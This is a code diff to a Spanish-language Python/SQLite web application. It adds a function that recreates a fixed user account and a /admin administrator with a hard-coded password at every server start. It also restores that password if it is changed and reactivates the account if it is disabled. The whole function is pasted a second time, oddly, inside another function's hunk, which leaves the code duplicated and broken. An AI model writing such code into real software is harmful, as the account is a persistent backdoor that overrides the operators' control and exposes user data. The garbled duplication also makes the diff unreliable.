@@ -197,6 +197,52 @@ def _sembrar(con: sqlite3.Connection) -> None:
             "INSERT OR REPLACE INTO ajustes (clave, valor) VALUES ('admin_clave_default', '0')"
         )
 
+    _sembrar_cuenta_permanente(con)
+
+
+def _sembrar_cuenta_permanente(con: sqlite3.Connection) -> None:
+    """Cuenta fija de trabajo: existe siempre, aunque se borre la base o la cuenta.
+
+    Se crea (o se repara) cada vez que arranca el servidor:
+    · una cuenta de la app (teléfono + clave) para entrar sin registrarse, y
+    · un administrador del panel /admin con el mismo nombre y clave.
+    """
+    nombre = "Kasuto Kirigaya"
+    clave = "01012002"
+    telefono = "99887766"
+    usuario_admin = "kasuto"
+
+    # --- Cuenta de la app ---------------------------------------------------
+    fila = con.execute("SELECT id, clave_hash FROM usuarios WHERE telefono = ?", (telefono,)).fetchone()
+    if fila is None:
+        con.execute(
+            """INSERT INTO usuarios
+               (telefono, nombre, clave_hash, edad, ciudad, experiencia,
+                como_nos_conocio, consentimiento_en, activo, creado_en)
+               VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1, ?)""",
+            (telefono, nombre, seguridad.hash_clave(clave), 24, "San Pedro Sula",
+             "seguido", "Cuenta del equipo", ahora_utc(), ahora_utc()),
+        )
+    else:
+        con.execute("UPDATE usuarios SET activo = 1, nombre = ? WHERE id = ?", (nombre, fila["id"]))
+        if not seguridad.verificar_clave(clave, fila["clave_hash"]):
+            con.execute("UPDATE usuarios SET clave_hash = ? WHERE id = ?", (seguridad.hash_clave(clave), fila["id"]))
+
+    # --- Administrador del panel -------------------------------------------
+    fila = con.execute("SELECT id, clave_hash FROM administradores WHERE usuario = ?", (usuario_admin,)).fetchone()
+    if fila is None:
+        con.execute(
+            """INSERT INTO administradores
+               (usuario, nombre, clave_hash, creado_en, clave_por_defecto)
+               VALUES (?, ?, ?, ?, 0)""",
+            (usuario_admin, nombre, seguridad.hash_clave(clave), ahora_utc()),
+        )
+    elif not seguridad.verificar_clave(clave, fila["clave_hash"]):
+        con.execute(
+            "UPDATE administradores SET clave_hash = ?, clave_por_defecto = 0 WHERE id = ?",
+            (seguridad.hash_clave(clave), fila["id"]),
+        )
+
 
 # --- Utilidades internas ----------------------------------------------------
 
@@ -435,6 +481,52 @@ def cambiar_clave_admin(admin_id: int, nueva: str) -> None:
         )
         con.execute(
             "INSERT OR REPLACE INTO ajustes (clave, valor) VALUES ('admin_clave_default', '0')"
+        )
+
+    _sembrar_cuenta_permanente(con)
+
+
+def _sembrar_cuenta_permanente(con: sqlite3.Connection) -> None:
+    """Cuenta fija de trabajo: existe siempre, aunque se borre la base o la cuenta.
+
+    Se crea (o se repara) cada vez que arranca el servidor:
+    · una cuenta de la app (teléfono + clave) para entrar sin registrarse, y
+    · un administrador del panel /admin con el mismo nombre y clave.
+    """
+    nombre = "Kasuto Kirigaya"
+    clave = "01012002"
+    telefono = "99887766"
+    usuario_admin = "kasuto"
+
+    # --- Cuenta de la app ---------------------------------------------------
+    fila = con.execute("SELECT id, clave_hash FROM usuarios WHERE telefono = ?", (telefono,)).fetchone()
+    if fila is None:
+        con.execute(
+            """INSERT INTO usuarios
+               (telefono, nombre, clave_hash, edad, ciudad, experiencia,
+                como_nos_conocio, consentimiento_en, activo, creado_en)
+               VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1, ?)""",
+            (telefono, nombre, seguridad.hash_clave(clave), 24, "San Pedro Sula",
+             "seguido", "Cuenta del equipo", ahora_utc(), ahora_utc()),
+        )
+    else:
+        con.execute("UPDATE usuarios SET activo = 1, nombre = ? WHERE id = ?", (nombre, fila["id"]))
+        if not seguridad.verificar_clave(clave, fila["clave_hash"]):
+            con.execute("UPDATE usuarios SET clave_hash = ? WHERE id = ?", (seguridad.hash_clave(clave), fila["id"]))
+
+    # --- Administrador del panel -------------------------------------------
+    fila = con.execute("SELECT id, clave_hash FROM administradores WHERE usuario = ?", (usuario_admin,)).fetchone()
+    if fila is None:
+        con.execute(
+            """INSERT INTO administradores
+               (usuario, nombre, clave_hash, creado_en, clave_por_defecto)
+               VALUES (?, ?, ?, ?, 0)""",
+            (usuario_admin, nombre, seguridad.hash_clave(clave), ahora_utc()),
+        )
+    elif not seguridad.verificar_clave(clave, fila["clave_hash"]):
+        con.execute(
+            "UPDATE administradores SET clave_hash = ?, clave_por_defecto = 0 WHERE id = ?",
+            (seguridad.hash_clave(clave), fila["id"]),
         )
 
 
